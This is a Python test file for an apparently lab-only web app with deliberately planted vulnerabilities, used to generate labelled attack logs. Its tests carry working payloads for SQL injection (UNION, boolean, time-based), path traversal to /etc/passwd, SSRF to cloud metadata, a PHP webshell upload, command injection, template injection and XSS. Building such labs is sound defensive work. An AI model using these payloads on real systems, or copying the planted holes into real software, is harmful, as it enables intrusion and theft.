"""The planted weaknesses, and their hardened counterparts.

Every row of VULNERABILITIES.md has a test here asserting the *successful*
exploit, and where there is a hardened equivalent, a test asserting that one
refuses. Both directions matter: a dataset where every attack succeeds teaches
something false, and one where every attack bounces teaches nothing.

These tests are also the check that the planted weaknesses still work. A
refactor that accidentally fixed one would leave the attack playbooks in Phase
E producing traffic labelled `exploitation` that never exploited anything, and
nothing else would notice.

Skipped unless LOGFORGE_DOCKER=1.
"""

import time
import unittest
from urllib.parse import quote

from tests.lab import (DOCKER_AVAILABLE, WEB_RES, compose, fetch, in_container,
                       wait_for_web)

BASE = f"http://{WEB_RES}"
JAR = "/tmp/jar"
USER = ("demo", "demo123")


def as_user(script, username=USER[0], password=USER[1]):
    return in_container(
        f"curl -s -o /dev/null -c {JAR} -d 'username={username}&password={password}' "
        f"{BASE}/login; " + script)


@unittest.skipUnless(DOCKER_AVAILABLE,
                     "needs Docker; set LOGFORGE_DOCKER=1 to run")
class TestPlantedWeaknesses(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        wait_for_web()

    @classmethod
    def tearDownClass(cls):
        compose("down", "-v")

    # 1 -- SQL injection in the catalogue search --------------------------

    def test_union_injection_in_search_returns_rows_from_another_table(self):
        payload = ("' UNION SELECT 1,2,3,username,password_hash,6,7,8 "
                   "FROM users--")
        status, body = fetch(f"{BASE}/search?q={quote(payload)}")
        self.assertEqual(status, "200")
        self.assertIn("agatha", body,
                      "the UNION did not surface a username in the results")

    def test_a_normal_search_does_not_surface_usernames(self):
        _, body = fetch(f"{BASE}/search?q=oak")
        self.assertNotIn("agatha", body)

    def test_boolean_injection_changes_the_result_count(self):
        # The term has to be one that matches nothing on its own. A bare
        # quote leaves `name LIKE '%'`, which is true for every row, so both
        # branches return the same page and the test proves nothing.
        true_payload = quote("zzqq' OR 1=1--")
        false_payload = quote("zzqq' OR 1=2--")
        _, true_body = fetch(f"{BASE}/search?q={true_payload}")
        _, false_body = fetch(f"{BASE}/search?q={false_payload}")
        self.assertNotEqual(len(true_body), len(false_body))

    def test_the_autocomplete_endpoint_resists_the_same_payload(self):
        # Hardened counterpart: prepared statement, so the identical payload
        # returns nothing instead of everything.
        payload = "' UNION SELECT 1,username FROM users--"
        status, body = fetch(f"{BASE}/api/autocomplete?q={quote(payload)}")
        self.assertEqual(status, "200")
        self.assertNotIn("agatha", body)

    # 2 -- IDOR on order lookup ------------------------------------------

    def test_a_customer_can_read_an_order_that_is_not_theirs(self):
        # Order 2 belongs to rmarsh; demo owns 1, 5, 9, 13.
        out = as_user(f"curl -s -b {JAR} -w '\\n%{{http_code}}' "
                      f"{BASE}/account/orders/2")
        body, _, status = out.rpartition("\n")
        self.assertEqual(status.strip(), "200")
        self.assertIn("Order #2", body)

    def test_the_addresses_page_stays_scoped_to_its_owner(self):
        # Hardened counterpart: same shape of lookup, still scoped.
        out = as_user(f"curl -s -b {JAR} {BASE}/account/addresses")
        self.assertIn("Kettleby", out)
        self.assertNotIn("Harnwood", out)

    # 3 -- Path traversal in the document download -----------------------

    def test_traversal_reads_a_file_outside_the_document_directory(self):
        # The documents live at /var/www/html/lib/docs, so reaching / takes
        # five levels. Attackers overshoot deliberately -- traversing past root
        # is harmless and saves counting.
        status, body = fetch(
            f"{BASE}/download?file={quote('../../../../../../../../etc/passwd')}")
        self.assertEqual(status, "200")
        self.assertIn("root:", body)

    def test_the_download_endpoint_still_serves_its_legitimate_documents(self):
        status, body = fetch(f"{BASE}/download?file=returns-policy.txt")
        self.assertEqual(status, "200")
        self.assertIn("returns", body.lower())

    # 4 -- SSRF in the image importer ------------------------------------

    def test_the_importer_fetches_whatever_host_it_is_given(self):
        status, body = fetch(
            f"{BASE}/admin/import-image?url="
            f"{quote('http://203.0.113.2/robots.txt')}")
        self.assertEqual(status, "200")
        self.assertIn("Fetched", body)

    def test_an_unreachable_target_answers_504_rather_than_500(self):
        # Cloud metadata is unroutable from the lab, so the attempt fails at
        # the network layer. The attempt is what lands in the dataset.
        status, _ = fetch(
            f"{BASE}/admin/import-image?url="
            f"{quote('http://169.254.169.254/latest/meta-data/')}")
        self.assertEqual(status, "504")

    # 5 -- Upload bypass ending in a webshell ----------------------------

    def test_a_double_extension_upload_is_accepted_and_then_executed(self):
        out = as_user(
            "printf '%s' '<?php echo \"SHELLOK:\".shell_exec($_GET[\"cmd\"]); ?>' "
            "> /tmp/x.php.jpg; "
            f"curl -s -o /dev/null -b {JAR} -F 'avatar=@/tmp/x.php.jpg;type=image/jpeg' "
            f"{BASE}/account/avatar; "
            f"curl -s '{BASE}/uploads/x.php.jpg?cmd=id'")
        self.assertIn("SHELLOK:", out, "the upload was not executed as PHP")
        self.assertIn("uid=", out)

    def test_a_plainly_executable_upload_is_still_refused(self):
        # The weak check is on the extension, so the obvious attempt fails and
        # only the double extension gets through -- which is the realistic bug.
        out = as_user(
            "printf 'x' > /tmp/y.php; "
            f"curl -s -o /dev/null -b {JAR} -w '%{{http_code}}' "
            f"-F 'avatar=@/tmp/y.php' {BASE}/account/avatar")
        self.assertEqual(out.strip(), "415")

    # 6 -- Command injection in the host check ---------------------------

    def test_the_host_check_runs_an_appended_command(self):
        status, body = fetch(f"{BASE}/admin/ping?host={quote('127.0.0.1;id')}")
        self.assertEqual(status, "200")
        self.assertIn("uid=", body)

    # 7 -- Server-side template injection --------------------------------

    def test_the_template_preview_evaluates_an_expression(self):
        status, body = fetch(f"{BASE}/admin/template?tpl={quote('{{7*7}}')}")
        self.assertEqual(status, "200")
        self.assertIn("49", body)

    # 8 -- Reflected XSS --------------------------------------------------

    def test_the_search_page_reflects_a_script_tag_unescaped(self):
        # Present for completeness, and near-invisible in an access log: the
        # payload shows in %r for the reflected case and stored XSS retrieval
        # is indistinguishable from ordinary browsing. Documented as a
        # labelling limitation rather than pretended to be detectable.
        payload = "<script>alert(1)</script>"
        _, body = fetch(f"{BASE}/search?q={quote(payload)}")
        self.assertIn(payload, body)


@unittest.skipUnless(DOCKER_AVAILABLE,
                     "needs Docker; set LOGFORGE_DOCKER=1 to run")
class TestTimeBasedInjection(unittest.TestCase):
    """SQLite has no SLEEP(), so the delay has to come from real work."""

    @classmethod
    def setUpClass(cls):
        wait_for_web()

    @classmethod
    def tearDownClass(cls):
        compose("down", "-v")

    def test_a_heavy_expression_delays_the_response_measurably(self):
        # Measured in the container: a three-way cross join is optimised away
        # in 28ms, but hexing a 200MB blob forces the work and takes ~1.0s
        # against ~0.03s for the same query without it. That is the
        # substitution for SLEEP(), and it is documented in VULNERABILITIES.md.
        payload = "' AND 1=(SELECT LENGTH(HEX(RANDOMBLOB(200000000))))--"
        started = time.monotonic()
        status, _ = fetch(f"{BASE}/search?q={quote(payload)}")
        slow = time.monotonic() - started

        started = time.monotonic()
        fetch(f"{BASE}/search?q=oak")
        quick = time.monotonic() - started

        self.assertEqual(status, "200")
        self.assertGreater(slow - quick, 0.4,
                           f"no measurable delay: slow={slow:.2f}s quick={quick:.2f}s")


if __name__ == "__main__":
    unittest.main()
